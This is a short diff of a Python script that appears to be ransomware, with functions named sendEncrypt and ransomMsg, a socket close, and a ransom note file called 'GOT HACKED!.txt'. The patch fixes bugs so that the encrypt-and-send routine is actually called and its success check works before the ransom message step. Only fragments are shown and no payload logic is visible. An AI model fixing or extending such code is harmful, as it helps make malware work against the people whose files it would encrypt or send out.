@@ -170,7 +170,7 @@ def sendEncrypt():
 
     finally:
         s.close()
-    return true
+    return True
 
 def ransomMsg():
     filename = "GOT HACKED!.txt"
@@ -189,5 +189,5 @@ def ransomMsg():
         print(e)
 
 if __name__ == '__main__':
-    if (sendEncrypt):
+    if (sendEncrypt()):
         ransomMsg
